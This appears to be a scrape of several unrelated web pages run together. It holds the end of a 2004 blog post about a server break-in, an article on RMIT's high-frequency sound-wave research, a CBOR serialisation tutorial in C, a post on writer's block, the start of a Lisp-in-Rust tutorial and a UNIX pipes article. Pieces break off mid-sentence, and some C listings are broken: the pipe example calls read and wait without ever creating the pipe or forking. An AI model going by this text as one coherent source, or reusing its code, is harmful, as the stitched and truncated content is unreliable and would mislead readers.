	cybercafe so note not to waste your time backtracing.  This is my
	job, don't take it personal.</p>

	<p>sincerely and respectfully.</p>

</blockquote>

<p>It's tough not to (especially since all this went down while three
hurricanes were headed our way) but I guess that's what I get for living in
a Gibsonian novel these days.</p>

<div>

	<h4>Update on Thursday, September 23<sup>rd</sup>, 2004</h4>

	<p>Just to clarify one last detail:  the cracker did 
	not social engineer his way into the colocation facility in <a href="http://fastcolo.net/" title="FastColo.net">Boca 
	Raton</a> or the <a href="http://www.napoftheamericas.com/">NAP 
	of the Americas</a> in Miami.  The physical access 
	mentioned was the corporate network of the company (which is not 
	located in South Florida) who's sites were hosted on the servers 
	in Boca and Miami.</p>

	<p>Just in case there might have been any confusion 
	on the matter.</p>

	simple: Start with the base link for this site: <a class="page" href="http://boston.conman.org/">http://boston.conman.org/</a>, then add the date you are
	interested in, say <a href="http://boston.conman.org/2000/08/01">2000/08/01</a>,
	so that would make the final <abbr title="Uniform Resource
	Locator">URL</abbr>:</p>

	<p><a class="page" href="http://boston.conman.org/2000/08/01">http://boston.conman.org/2000/08/01</a></p>

	<p>You can also specify the entire month by leaving off the day
	portion.  You can even select <a class="page" href="http://boston.conman.org/about/technical.html">an arbitrary portion of time.</a></p>

	<p>You may also note subtle shading of the links and that's
	intentional: the “closer” the link is (relative to the
	page) the “brighter” it appears.  It's an experiment in
	using color shading to denote the distance a link is from here.  If
	you don't notice it, don't worry; it's not all <em>that</em>
	important.</p>

	<p>It is assumed that every brand name, slogan, corporate name,
	symbol, design element, et cetera mentioned in these pages is a
	protected and/or trademarked entity, the sole property of its
	owner(s), and acknowledgement of this status is implied.</p>

and revealed how little we really know.</p><p>“Trying to explain the science of what we see and then applying that to solve practical problems is a big and exciting challenge.”</p><h2><b>Sonic waves: how to power chemistry with sound</b></h2><p>The RMIT research team, which includes Dr Amgad Rezk, Dr Heba Ahmed and Dr Shwathy Ramesan, &nbsp;generates high-frequency sound waves on a microchip to precisely manipulate fluids or materials.<b></b></p><p>Ultrasound has long been used at low frequencies – around 10 kHz to 3 MHz – to drive chemical reactions, a field known as “sonochemistry”.</p><p>At these low frequencies, sonochemical reactions are driven by the violent implosion of air bubbles.</p><p>This process, known as cavitation, results in huge pressures and ultra-high temperatures – like a tiny and extremely localised pressure cooker.</p><p>But it turns out that if you up the frequency, these reactions change completely.</p><p>When high frequency sound waves were transmitted into various materials and cells, the researchers saw behaviour that had never been observed with low-frequency ultrasound.</p><p>“We’ve seen self-ordering molecules that seem to orient themselves in the crystal along the direction of the sound waves,” Yeo says.</p><p>“The sound wavelengths involved can be over 100,000 times larger than an individual molecule, so it’s incredibly puzzling how something so tiny can be precisely manipulated with something so big.</p><p>“It’s like driving a truck through a random scattering of Lego bricks, then finding those pieces stack nicely on top of each other – it shouldn’t happen!”</p><figure data-orig-width="1440" data-orig-height="864"><img src="https://64.media.tumblr.com/8d5ee23b784df9d8907d7555def41702/f3bfa749bd5ae15c-4e/s1280x1920/ecef32e8d7eebee05e2f681b3f85a4db727b5046.jpg" alt="image" data-orig-width="1440" data-orig-height="864" width="1280" height="768"></figure><p><i>Image:&nbsp;The patented ‘Respite’ nebuliser uses high-frequency sound waves to precisely deliver drugs to the lungs.

University</a>.</i></p><h2><b>Biomedical advances</b></h2><p>While low-frequency cavitation can often destroy molecules and cells, they remain mostly intact under the high-frequency sound waves.</p><p>This makes them gentle enough to use in biomedical devices to manipulate biomolecules and cells without affecting their integrity – the basis for the various drug delivery technologies patented by the RMIT research team.</p><p>One of these patented devices is a cheap, lightweight and portable advanced nebuliser that can precisely deliver large molecules such as DNA and antibodies, unlike existing nebulisers.</p><p>This opens the potential for painless, needle-free vaccinations and treatments.</p><p>The nebuliser uses high-frequency sound waves to excite the surface of the fluid or drug, generating a fine mist that can deliver larger biological molecules directly to the lungs.</p><p>The nebuliser technology can also be used to encapsulate a drug in protective polymer nanoparticles, in a one-step process bringing together nano-manufacturing and drug delivery.</p><p>In addition, the researchers have shown irradiating cells with the high-frequency sound waves allows therapeutic molecules to be inserted into the cells without damage, a technique that can be used in emerging cell-based therapies.</p><h2><b>Smart materials</b></h2><p>The team has used the sound waves to drive crystallisation for the sustainable production of metal-organic frameworks, or MOFs.</p><p>Predicted to be the defining material of the 21<sup>st</sup> century, MOFs are ideal for sensing and trapping substances at minute concentrations, to purify water or air, and can also hold large amounts of energy, for making better batteries and energy storage devices.</p><p>While the conventional process for making a MOF can take hours or days and requires the use of harsh solvents or intensive energy processes, the RMIT team has developed a clean, sound wave-driven technique that can produce a customised MOF in minutes and can be easily scaled up for efficient mass production.</p><p>Sound waves can also be used for nano-manufacturing 2D materials, which are used in myriad applications from flexible electric circuits to solar cells.</p><h2><b>Scaling up and pushing boundaries</b></h2><p>The next steps for the RMIT team are focused on scaling up the technology.</p><p>At a low cost of just $US0.70 per device, the sound wave-generating microchips can be produced using the standard processes for mass fabrication of silicon chips for computers.</p><p>“This opens the possibility of producing industrial quantities of materials with these sound waves through massive parallelisation – using thousands of our chips simultaneously,” Yeo said.</p><p>The team at the

physics theories, opening up a new field of “high frequency excitation” in parallel to sonochemistry.</p><p>“The classical theories established since the mid-1800s don’t always explain the strange and

In the embedded world, it’s not uncommon to serialize data so it can be efficently sent through the ether. On the other end it’s reassembled and used however necessary. In today’s post we’ll chat about serializing with <a href="https://cbor.io/" target="_blank">CBOR</a> (CBOR stands for Concise Binary Object Reprentation). It’s open, widely adopted and available in most popular programming languages.</p><p>The idea of CBOR is to take a structure or object, pack it up efficently for network usage. That way we transmit the least amount of data necessary. This will save you bandwidth but also cost especially for LTE deployments.</p><p>For the purpose of this post we’ll be creating a simple codec for use in embedded. On the “cloud” side we’ll use Rust’s <code>serde_cbor</code> to do the heavy lifting for us. We’ll start with the embedded side.</p><h2 id="your-embedded-options">Your embedded options</h2><p>For the purposes of this post, we’ll work on creating an example you can run on the machine you’re using. The only extra thing you’ll need for the process is to download and include a CBOR library in your project. I’m using <a href="https://github.com/laurencelundblade/QCBOR" target="_blank">QCBOR</a> for this example but other libraries are available like <a href="https://github.com/intel/tinycbor" target="_blank">TinyCBOR</a>. I’ve chosen QCBOR over the later because of its ease of use.</p><h2 id="creating-the-c-codec">Creating the C Codec</h2><p>First, lets create a codec that will encode and decode messages into CBOR format.</p><ol><li><p>First, let’s create the header file: <code>telemetry_codec.h</code></p><div><pre><code data-lang="c"><span>#include</span> <span>&lt;qcbor/qcbor.h&gt;</span><span>
</span><span></span>
<span>/* Position enum */</span>
<span>enum</span>
{
    telemetry_version_pos,
    telemetry_rssi_pos,
} telemetry_data_positions;

<span>/* Used to store strings */</span>
<span>typedef</span> <span>struct</span>
{
    <span>char</span> bytes[<span>64</span>];
    size_t size;
} telemetry_data_string_t;

<span>/* Struct for telemetry data */</span>
<span>typedef</span> <span>struct</span>
{
    telemetry_data_string_t version;
    int32_t rssi;

} telemetry_data_t;

<span>/* Encode function */</span>
QCBORError <span>telemetry_codec_encode</span>(<span>const</span> telemetry_data_t <span>*</span>p_data, uint8_t <span>*</span>p_buf, size_t len, size_t <span>*</span>p_size);
</code></pre></div><p>As you can see above, <code>telemetry_data_t</code> is the data that we’re trying to encode/decode. Within <code>telemetry_data_t</code> is a <code>telemetry_data_string_t</code> which you can use to store variable length buffer for strings.</p><p>You’ll also notice that i’m defining an enum called <code>telemetry_data_positions</code>. This definies the position in the CBOR that each piece of data will live. This is in substitution of string key/value setup like you’d often see in JSON. See below:</p><p>Instead of:</p><p>You get something like this:</p><p>As you can imagine, you’re saving some bytes here. Even more when you encode using CBOR rather than JSON!</p></li><li><p>Next we’ll want to define the encode function in <code>telemetry_codec.c</code>. First using the defintion provided in the <code>.h</code> file:</p><div><pre><code data-lang="c">QCBORError telemetry_codec_encode(<span>const</span> telemetry_data_t <span>*</span>p_data, uint8_t <span>*</span>p_buf, size_t len, size_t <span>*</span>p_size)
</code></pre></div><p>Within the function we want to set up a <code>UsefulBuf</code> which we’ll be encoding the data into. There’s also a <code>QCBOREncodeContext</code> that will contain the state of the encoder as it’s used:</p><div><pre><code data-lang="c">    <span>// Setup of the goods
</span><span></span>    UsefulBuf buf <span>=</span> {
        .ptr <span>=</span> p_buf,
        .len <span>=</span> len};
    QCBOREncodeContext ec;
    QCBOREncode_Init(<span>&amp;</span>ec, buf);
</code></pre></div><p>There are a handful ways to encode data. To emulate a JSON key/value store we’ll be putting our values into a map:</p><div><pre><code data-lang="c">    <span>/* Create over-arching map */</span>
    QCBOREncode_OpenMap(<span>&amp;</span>ec);
</code></pre></div><p>This allows us to use functions like <code>QCBOREncode_AddBytesToMapN</code> and <code>QCBOREncode_AddInt64ToMapN</code> to add data along with a position key:</p><div><pre><code data-lang="c">    <span>/* Add the version string */</span>
    UsefulBufC data <span>=</span> {
        .ptr <span>=</span> p_data<span>-&gt;</span>version.bytes,
        .len <span>=</span> p_data<span>-&gt;</span>version.size};
    QCBOREncode_AddBytesToMapN(<span>&amp;</span>ec, telemetry_version_pos, data);

    <span>/* Add the rssi */</span>
    QCBOREncode_AddInt64ToMapN(<span>&amp;</span>ec, telemetry_rssi_pos, p_data<span>-&gt;</span>rssi);
</code></pre></div><p>As you can see above, you can use another <code>UsefulBufC</code> for encoding the bytes from the <code>version</code>. You can encode values into a singluar entry by using <code>QCBOREncode_AddInt64ToMapN</code> or similar. This function will size the CBOR output appropirately an send the least amount of bytes necessary. Thus, in reality it will almost never send a fully 64 bit number.</p><p>Finally, make sure you close out the map and finish encoding!</p><div><pre><code data-lang="c">    <span>/* Close the map*/</span>
    QCBOREncode_CloseMap(<span>&amp;</span>ec);

    <span>/* Finish !*/</span>
    <span>return</span> <span>QCBOREncode_FinishGetSize</span>(<span>&amp;</span>ec, p_size);
</code></pre></div><p>In the end your <code>telemetry_codec.c</code> should look something like this:</p><div><pre><code data-lang="c"><span>#include</span> <span>&lt;telemetry_codec.h&gt;</span><span>
</span><span>#include</span> <span>&lt;stdio.h&gt;</span><span>
</span><span></span>
<span>/* Encode function */</span>
QCBORError <span>telemetry_codec_encode</span>(<span>const</span> telemetry_data_t <span>*</span>p_data, uint8_t <span>*</span>p_buf, size_t len, size_t <span>*</span>p_size)
{

    <span>// Setup of the goods
</span><span></span>    UsefulBuf buf <span>=</span> {
        .ptr <span>=</span> p_buf,
        .len <span>=</span> len};
    QCBOREncodeContext ec;
    QCBOREncode_Init(<span>&amp;</span>ec, buf);

    <span>/* Create over-arching map */</span>
    QCBOREncode_OpenMap(<span>&amp;</span>ec);

    <span>/* Add the version string */</span>
    UsefulBufC data <span>=</span> {
        .ptr <span>=</span> p_data<span>-&gt;</span>version.bytes,
        .len <span>=</span> p_data<span>-&gt;</span>version.size};
    QCBOREncode_AddBytesToMapN(<span>&amp;</span>ec, telemetry_version_pos, data);

    <span>/* Add the rssi */</span>
    QCBOREncode_AddInt64ToMapN(<span>&amp;</span>ec, telemetry_rssi_pos, p_data<span>-&gt;</span>rssi);

    <span>/* Close the map*/</span>
    QCBOREncode_CloseMap(<span>&amp;</span>ec);

    <span>/* Finish !*/</span>
    <span>return</span> QCBOREncode_FinishGetSize(<span>&amp;</span>ec, p_size);
}
</code></pre></div><p>That’s all what’s needed to encode a <code>telemetry_data_t</code> strucure! I’ve also created a decode function in the example code. You can get that at the bottom of this post.</p></li></ol><h2 id="creating-the-http-client">Creating the HTTP Client</h2><ol><li><p>Before getting started you’ll need some dependencies. On Mac you can install <code>cmake</code> and <code>curl</code> using <a href="https://brew.sh/" target="_blank">Homebrew</a>.</p><div><pre><code data-lang="bash">&gt; brew install cmake curl
</code></pre></div></li><li><p>You should also create a <code>CMakeLists.txt</code> with the following contents:</p><div><pre><code data-lang="fallback">cmake_minimum_required(VERSION 3.8.2)

# Project
project(CBORClientExample)

# Include directory
include_directories(include)
include_directories(lib/QCBOR/inc/)

# Include sources 
file(GLOB QCBOR_FILES lib/QCBOR/src/*.c)

# Libcurl
link_libraries(curl)

# Executable
add_executable(client main.c src/telemetry_codec.c ${QCBOR_FILES})
</code></pre></div><p>This allows us to import dependencies and compile everything that’s needed. You’ll also notice that theres a <code>lib/QCBOR</code> reference. We’ll need to clone the QCBOR repo for that:</p><div><pre><code data-lang="bash">&gt; mkdir -p lib/
&gt; cd lib
&gt; git clone https://github.com/laurencelundblade/QCBOR.git
</code></pre></div><p>In the example code I added it as a submodule. No cloning necessary. (Initialize with <code>git submodule update --init</code>)</p></li><li><p>Finally in <code>main.c</code> you we can get to work encoding some data and then sending it via HTTP. First let’s create the data:</p><div><pre><code data-lang="c"><span>/* Create the object */</span>
telemetry_data_t data <span>=</span> {
    .rssi <span>=</span> <span>-</span><span>49</span>,
    .version <span>=</span> {
        .bytes <span>=</span> <span>"0.1.0"</span>,
        .size <span>=</span> strlen(<span>"0.1.0"</span>),
    }};
</code></pre></div><p>Then ecode using the <code>telemetry_codec_encode</code> function we just created:</p><div><pre><code data-lang="c"><span>/* Encode the data */</span>
uint8_t buf[<span>256</span>];
size_t size <span>=</span> <span>0</span>;
QCBORError err <span>=</span> telemetry_codec_encode(<span>&amp;</span>data, buf, <span>sizeof</span>(buf), <span>&amp;</span>size);
<span>if</span> (err)
    printf(<span>"QCBOR Error: %d</span><span>\n</span><span>"</span>, err);
</code></pre></div><p>Then using some modified example code from <a href="https://curl.se/libcurl/c/http-post.html" target="_blank">here</a>, we’ll POST the data to the Rust server we’ll develop in the next section:</p><div><pre><code data-lang="c">    <span>/* Send data using Libcurl */</span>
    <span>/* Adopted from here: https://curl.se/libcurl/c/http-post.html */</span>
    CURL <span>*</span>curl;
    CURLcode res;

    <span>/* In windows, this will init the winsock stuff */</span>
    curl_global_init(CURL_GLOBAL_ALL);

    <span>/* get a curl handle */</span>
    curl <span>=</span> curl_easy_init();
    <span>if</span> (curl)
    {
        <span>/* First set the URL that is about to receive our POST. This URL can
</span><span>       just as well be a https:// URL if that is what should receive the
</span><span>       data. */</span>
        curl_easy_setopt(curl, CURLOPT_URL, <span>"http://localhost:3030/telemetry/1234"</span>);

        <span>/* Now specify the POST data */</span>
        curl_easy_setopt(curl, CURLOPT_POSTFIELDSIZE, size);
        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, buf);

        res <span>=</span> curl_easy_perform(curl);
        <span>/* Check for errors */</span>
        <span>if</span> (res <span>!=</span> CURLE_OK)
            fprintf(stderr, <span>"curl_easy_perform() failed: %s</span><span>\n</span><span>"</span>,
                    curl_easy_strerror(res));

        <span>/* always cleanup */</span>
        curl_easy_cleanup(curl);
    }
    curl_global_cleanup();
</code></pre></div><p>The biggest difference fromt he example is the usage of <code>CURLOPT_POSTFIELDSIZE</code> and <code>CURLOPT_POSTFIELDS</code>:</p><div><pre><code data-lang="c"><span>/* Now specify the POST data */</span>
curl_easy_setopt(curl, CURLOPT_POSTFIELDSIZE, size);
curl_easy_setopt(curl, CURLOPT_POSTFIELDS, buf);
</code></pre></div><p>This will define the variable sized data we have to send over after encoding. In this case the size will be <code>size</code> and the buffer involved is <code>buf</code> (defined earlier)</p><p>Here’s a full look at the code:</p><div><pre><code data-lang="c"><span>#include</span> <span>&lt;telemetry_codec.h&gt;</span><span>
</span><span>#include</span> <span>&lt;qcbor/qcbor.h&gt;</span><span>

<p>A friend once advised me to write down all that he explained to me whenever I came to him for clarification on a topic, because even though I would understand all that he taught me, not writing those things down because I had understood them always made me come back to him for the same solution over and over and over again. Blogging about what I just learned or had learned in the past showed me the relevance of his advice.</p>
<p>I have found certain points to be responsible for <a target="_blank" href="https://dictionary.cambridge.org/dictionary/english/writer-s-block">writer's block</a> </p>
<h2>Vagueness of a topic</h2>
<p>Not knowing much or anything about a topic definitely leads to writer's block. The solution to this is seeking clarity about the topic(read it up or discuss it).</p>
<h2>Fear of the topic not being good enough</h2>
<p>This happened to me last night when I was writing on <a target="_blank" href="https://afy.afomaorji.com/basic-javascript-golf-code">Golf Code</a>. The solution to this is knowing that the article is firstly for you. When I applied this solution by reminding myself that I wouldn't want to start cracking my head for an explanation to some topics, I damned the consequences, and guess what? When I started writing on it, the more I wrote, the more I had more ideas to write on 😉. In the end, did it help others? Yes it did 😊.</p></div></div></section></div></div>]]>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><div><p><span><p>Many years ago, Peter Norvig wrote a beautiful article <a href="http://norvig.com/lispy.html" target="_blank">about creating a lisp interpreter in Python</a>. It’s the most fun tutorial I’ve seen, not just because it teaches you about my favorite language family (Lisp), but because it cuts through to the essence of interpreters, is fun to follow and quick to finish.</p><p>Recently, I had some time and wanted to learn Rust. It’s a beautiful systems language, and I’ve seen some great work come out from those who adopt it. I thought, <em>what better way to learn Rust, than to create a lisp interpreter in it?</em></p><p><strong>Hence, Risp — a lisp in rust — was born.</strong> In this essay you and I will follow along with <a href="http://norvig.com/lispy.html" target="_blank">Norvig’s Lispy</a>, but instead of Python, we’ll do it in Rust 🙂.</p><p>If you haven’t heard of lisp, some Paul Graham’s essays (<a href="http://www.paulgraham.com/progbot.html" target="_blank">one</a>, <a href="http://www.paulgraham.com/diff.html" target="_blank">two</a>, <a href="http://www.paulgraham.com/avg.html" target="_blank">three</a>), alongside some <a href="https://m.stopa.io/favorite-rich-hickey-talks-6bcb23da6ff2" target="_blank">Rich Hickey talks</a> will get you fired up. In short, everything is a list, everything is an expression, and that makes for a very powerful language.</p><p>Our structure will be similar to Norvig’s tutorial, though I depart slightly in two ways:</p><ol><li>Instead of 2 stopping points (Lispy Calculator and Full Lispy), we have 4 stopping points. This reflects the phases I took to build it in Rust.</li><li>Norvig’s syntax is based on Scheme. We will base it on Scheme too, but since I’m also a Clojure fan, I sometimes used slightly different naming, and different implementations for a few functions. I will note when I do that in the essay.</li></ol><p>Finally, this is the first program I wrote in Rust. I may have misused some things, so if you’re a Rust hacker, I’d love to hear your feedback 🙂.</p><p>With the notes out of the way, let’s get into it.</p><p>As Norvig suggests, our first goal is to create a subset of lisp, that can do what a basic calculator can do.</p><p>To make it as simple as possible to follow, for language 1, <strong>we’ll <em>only</em> support addition and subtraction.</strong> No variable definitions, no if statements, nada.</p><p>This departs a bit from Lispy, but I found this stopping point a lot more convenient when writing it in Rust. So, our goal:</p><pre><code><span>(</span><span>+</span><span> </span><span>10</span><span> </span><span>5</span><span> </span><span>2</span><span>)</span><span>//=&gt; 17</span>
<span>(</span><span>-</span><span> </span><span>10</span><span> </span><span>5</span><span> </span><span>2</span><span>) </span><span>//=&gt; 3</span></code></pre><p>The important process we need to remember is the flow of an interpreter:</p><p><em>our program</em> ⟶ <em><strong>parse</strong></em> ⟶ <em>abstract syntax tree</em> ⟶ <em><strong>eval</strong></em> ⟶ <em>result</em></p><p>We will need to <strong>parse</strong> our program and convert it into an abstract syntax tree. After that, we can <strong>eval</strong> the abstract syntax tree and get our result. (Refer to Norvig’s article for more detailed definitions and explanations).</p><h2 id="type-definitions">Type Definitions</h2><p>Risp can have three kinds of values for now:</p><pre><code><span>#[derive(Clone)]</span>
<span>enum</span><span> </span><span>RispExp</span><span> {</span>
<span>  </span><span>Symbol</span><span>(</span><span>String</span><span>),</span>
<span>  </span><span>Number</span><span>(</span><span>f64</span><span>),</span>
<span>  </span><span>List</span><span>(</span><span>Vec</span><span>&lt;</span><span>RispExp</span><span>&gt;</span><span>),</span>
<span>} </span></code></pre><p>We’ll also need an error type. We’ll keep this simple, but if you’re curious there <em>is</em> a <a href="https://news.ycombinator.com/item?id=19812159" target="_blank">more robust approach</a>.</p><pre><code><span>#[derive(Debug)]</span>
<span>enum</span><span> </span><span>RispErr</span><span> {</span>
<span>  </span><span>Reason</span><span>(</span><span>String</span><span>),</span>
<span>}</span></code></pre><p>Finally, we’ll need an <em>environment</em> type. This is where we will store defined variables, built-in functions, and so forth:</p><pre><code><span>#[derive(Clone)]</span>
<span>struct</span><span> </span><span>RispEnv</span><span> {</span>
<span>  data: HashMap</span><span>&lt;</span><span>String</span><span>, RispExp</span><span>&gt;</span><span>,</span>
<span>}</span></code></pre><h2 id="parsing">Parsing</h2><p>Our goal is to take our program, and build an abstract syntax tree from it. For us, that is going to be a <code>RispExp</code>. To do this, first we will take our program, and cut it up into a bunch of tokens:</p><pre><code><span>tokenize(</span><span>"(+ 10 5)"</span><span>) </span><span>//=&gt; ["(", "+", "10", "5", ")"]</span></code></pre><p>Here’s how we can do that in Rust:</p><pre><code><span>fn</span><span> </span><span>tokenize</span><span>(expr: </span><span>String</span><span>) -&gt; </span><span>Vec</span><span>&lt;</span><span>String</span><span>&gt; {</span>

<p>A pipe is a first-in-first-out interprocess communication channel.
The pipe version as it is known today was invented by an American Computer Scientist
<a href="https://en.wikipedia.org/wiki/Douglas_McIlroy">Douglas McIlroy</a>
and incorporated into Version 3 AT&amp;T UNIX in 1973 by
<a href="https://en.wikipedia.org/wiki/Ken_Thompson">Ken Thompson</a>.</p>

<p>It was inspired by the observation that frequently the output of one application is
used as an input for another. This concept can be reused to connect a chain
of processes. This is frequently observed
in UNIX shell constructs that utilize the <code>|</code> operator.</p>

<div><pre><code data-lang="bash">$ find lib -name *.c | awk -F <span>'/'</span> <span>'{print $NF}'</span> | sort -u | tail
yp_maplist.c
yp_master.c
yp_match.c
yp_order.c
yperr_string.c
yplib.c
ypprot_err.c
yyerror.c
zdump.c
zic.c</code></pre></div>

<p>This can be illustrated as a sequence of processes and pipes connecting the programs.</p>

<p><img src="https://raw.githubusercontent.com/Moritz-Systems/moritz_staticDir/master/pipe-chain.svg" alt="pipe chain"></p>

<p>This concept of connecting the UNIX tools has been expanded to various native tools,
such as the troff formatting system, that are specifically designed to be used in pipelines.
The troff format and the associated toolkit are still used in the NetBSD Operating System.
The build rules, producing the <code>.ps</code> files (<a href="https://en.wikipedia.org/wiki/PostScript">PostScript</a>)
look like this one, for
the kernmalloc (the kernel allocator documentation) example:</p>

<h2 id="the-c-interface-for-pipes">The C interface for pipes</h2>

<p>The <a href="https://pubs.opengroup.org/onlinepubs/9699919799/functions/pipe.html">POSIX specification</a>
declares the <code>pipe</code> function with the following signature:</p>



<p>inside the <code>&lt;unistd.h&gt;</code> header.</p>

<p>The <code>pipe</code> function takes an array of two integers, and writes file descriptors
of the read and write end of the pipe into it upon successful return.
The <code>fildes[0]</code> file descriptor is opened for reading and <code>fildes[1]</code> for writing.
Some implementations of UNIX allow using the <code>fildes[0]</code> end for writing too and <code>fildes[1]</code> for reading
(the full duplex mode), but this behavior is unspecified by POSIX and it is only safe to assume that
they are unidirectional (half duplex mode).</p>

<p>The <code>pipe</code> call can fail and return <code>-1</code>, setting appropriate <code>errno</code>
if the process (<code>EMFILE</code>) or the system (<code>ENFILE</code>) expired the allowed number of
open file descriptors.</p>

<p><img src="https://raw.githubusercontent.com/Moritz-Systems/moritz_staticDir/master/pipe-in-process.svg" alt="pipe in a process"></p>

<p>This interface as it looks is appropriate only for processes that have the shared ancestor (usually the direct parent)
and is usually combined with <code>fork(2)</code>/<code>vfork(2)</code>/<code>posix_spawn(3)</code> or an equivalent interface
(otherwise the pipe would be a futile feature).
To workaround the limitation of having the shared predecessor,
the fifo special files or UNIX domain sockets can be used.</p>

<p>In the UNIX system, file descriptors are inherited by children by default (with some exceptions in modern APIs)
and thus the created pipe, referenced by the array of two file descriptors, connects the child and the parent.</p>

<p><img src="https://raw.githubusercontent.com/Moritz-Systems/moritz_staticDir/master/pipe-after-fork.svg" alt="pipe after fork"></p>

<p>In order to make the pipe effective, the user has to decide the direction of the data flow and
close the other ends. If the intention is to send data from process A to process B, then we need
to close the <code>fildes[0]</code> (reading) end in process A and <code>fildes[1]</code> (writing) end in process B.</p>

<p><img src="https://raw.githubusercontent.com/Moritz-Systems/moritz_staticDir/master/pipe-after-fork2.svg" alt="pipe after fork"></p>

<p>Now, the processes can transmit data over the pipe channel.</p>

<p>This algorithm is coded as follows:</p>

<div><pre><code data-lang="c"><span>/* CC0 1.0 Universal (CC0 1.0) - Public Domain Dedication */</span>

<span>int</span>
<span>main</span>(<span>int</span> argc, <span>char</span> <span>**</span>argv)
{
	<span>char</span> c;
	<span>int</span> status;
	pid_t child;
	<span>int</span> fildes[<span>2</span>];

		err(EXIT_FAILURE, <span>"fork"</span>);

	<span>if</span> (child <span>==</span> <span>0</span>) {
		<span>/* child */</span>
		<span>if</span> (close(fildes[<span>1</span>]) <span>==</span> <span>-</span><span>1</span>)
			err(EXIT_FAILURE, <span>"close"</span>);
		read(fildes[<span>0</span>], <span>&amp;</span>c, <span>1</span>);
		printf(<span>"Received: %c</span><span>\n</span><span>"</span>, c);
		<span>/* force the buffer to be printed on the output (screen) */</span>
		fflush(stdout);
		_exit(<span>0</span>);
	}
	<span>/* parent */</span>
	<span>if</span> (close(fildes[<span>0</span>]) <span>==</span> <span>-</span><span>1</span>)
		err(EXIT_FAILURE, <span>"close"</span>);
	<span>if</span> (write(fildes[<span>1</span>], <span>"x"</span>, <span>1</span>) <span>==</span> <span>-</span><span>1</span>)
		err(EXIT_FAILURE, <span>"write"</span>);

	<span>/* wait for the child process termination */</span>
	<span>if</span> (wait(<span>&amp;</span>status) <span>==</span> <span>-</span><span>1</span>)
		err(EXIT_FAILURE, <span>"wait"</span>);

	<span>return</span> EXIT_SUCCESS;
}</code></pre></div>

<p>NB. For the sake of simplicity, certain code paths such as handling interrupts (<code>EINTR</code>) were omitted.</p>

<p>The execution of this program results with:</p>



<p>The UNIX designers put the following constraints on the pipes (assuming <code>O_NONBLOCK</code> not set):</p>

<ul>
<li>Once the readable end of the pipe is closed, any attempt done to write results with <code>SIGPIPE</code> emitted into the writing process.
A process can either be killed or catch or ignore the signal and then needs to handle the error (<code>-1</code> and errno set to <code>EPIPE</code>) manually.</li>
<li>Once the writable end of the pipe is closed, an attempt to read from the pipe returns <code>0</code> and notifes <code>EOF</code> on the file descriptor.</li>
</ul>

<p>Additionally:</p>

<ul>
<li>The amount of free space inside the pipe (kernel buffering) is limited and implementation specific.</li>
<li>When the child process starts, the default stdio I/O buffering on pipes defaults to the fully buffered mode.
The three basic approaches to workaround this are:

<ul>
<li>using <code>fflush(3)</code> explicitly,</li>
<li>changing the buffering mode (<code>setvbuf(3)</code>) or</li>
<li>using pseudo terminals if the child process is not modifiable.</li>
</ul></li>
</ul>

<h2 id="the-kernel-pipe-buffer-size">The kernel pipe buffer size</h2>

<p>The size of the kernel buffer storing the pipe data is limited and will cause further attempts to <code>write(2)</code> data to block
until the space is regained, by the <code>read(2)</code> operation on the other end.
The minimum acceptable value in a <a href="https://pubs.opengroup.org/onlinepubs/9699919799/basedefs/limits.h.html">POSIX system</a>
is set to 512 bytes.</p>

<p>In order to check the maximum number of bytes that can be written atomically to a pipe, a programer can use the compiler constant <code>PIPE_BUF</code> or
the dynamic value <code>_PC_PIPE_BUF</code> passed to <code>pathconf(2)</code> or <code>fpathconf(2)</code>.
<code>pathconf(2)</code> and <code>fpathconf(2)</code> can be applied on:</p>

<ul>
<li>directories that can contain fifo files,</li>
<li>fifo files.</li>
</ul>

<p>Additionally, <code>fpathconf(2)</code> can be applied on the pipe file descriptor.</p>

<div><pre><code data-lang="c"><span>/* CC0 1.0 Universal (CC0 1.0) - Public Domain Dedication */</span>
<span>#include</span> <span>&lt;err.h&gt;</span><span>

<span>main</span>(<span>int</span> argc, <span>char</span> <span>**</span>argv)
{
	<span>int</span> fildes[<span>2</span>];

	<span>if</span> (pipe(fildes) <span>==</span> <span>-</span><span>1</span>)
		err(EXIT_FAILURE, <span>"pipe"</span>);

	printf(<span>"_PC_PIPE_BUF: %ld</span><span>\n</span><span>"</span>, fpathconf(fildes[<span>1</span>],_PC_PIPE_BUF));
	printf(<span>"PIPE_BUF: %d</span><span>\n</span><span>"</span>, PIPE_BUF);

	<span>return</span> EXIT_SUCCESS;
}</code></pre></div>

<p>However, the real number is usually larger. It can be retrieved with <code>ioctl(FIONSPACE)</code> on NetBSD.
This feature is unavailable on other systems: FreeBSD, OpenBSD and Linux, thus FreeBSD implements
<code>FIONSPACE</code> for sockets, but not for pipes.</p>

<div><pre><code data-lang="c"><span>/* CC0 1.0 Universal (CC0 1.0) - Public Domain Dedication */</span>
<span>#include</span> <span>&lt;sys/types.h&gt;</span><span>
</span><span>#include</span> <span>&lt;sys/ioctl.h&gt;</span><span>
</span><span></span>
<span>#include</span> <span>&lt;err.h&gt;</span><span>
</span><span>#include</span> <span>&lt;stdio.h&gt;</span><span>
</span><span>#include</span> <span>&lt;stdlib.h&gt;</span><span>
</span><span>#include</span> <span>&lt;unistd.h&gt;</span><span>
</span><span></span>
<span>int</span>
<span>main</span>(<span>int</span> argc, <span>char</span> <span>**</span>argv)
{
	<span>int</span> fildes[<span>2</span>];
	<span>int</span> n;

	<span>if</span> (pipe(fildes) <span>==</span> <span>-</span><span>1</span>)
		err(EXIT_FAILURE, <span>"pipe"</span>);

	<span>if</span> (ioctl(fildes[<span>1</span>], FIONSPACE, <span>&amp;</span>n) <span>==</span> <span>-</span><span>1</span>)
		err(EXIT_FAILURE, <span>"ioctl"</span>);
	printf(<span>"FIONSPACE fildes[1]: %d</span><span>\n</span><span>"</span>, n);

	<span>return</span> EXIT_SUCCESS;
}</code></pre></div>

<p>An alternative approach to check the maximum buffer size of the pipe feature is to count the
bytes writable into it manually, one by one, and to detect the hang.
This can be achieved for example with the <code>alarm(3)</code> call, unblocking the hang.</p>

<div><pre><code data-lang="c"><span>/* CC0 1.0 Universal (CC0 1.0) - Public Domain Dedication */</span>
<span>#include</span> <span>&lt;err.h&gt;</span><span>
</span><span>#include</span> <span>&lt;signal.h&gt;</span><span>
</span><span>#include</span> <span>&lt;stdio.h&gt;</span><span>
</span><span>#include</span> <span>&lt;stdlib.h&gt;</span><span>
</span><span>#include</span> <span>&lt;unistd.h&gt;</span><span>
</span><span></span>
<span>static</span> <span>int</span> n;

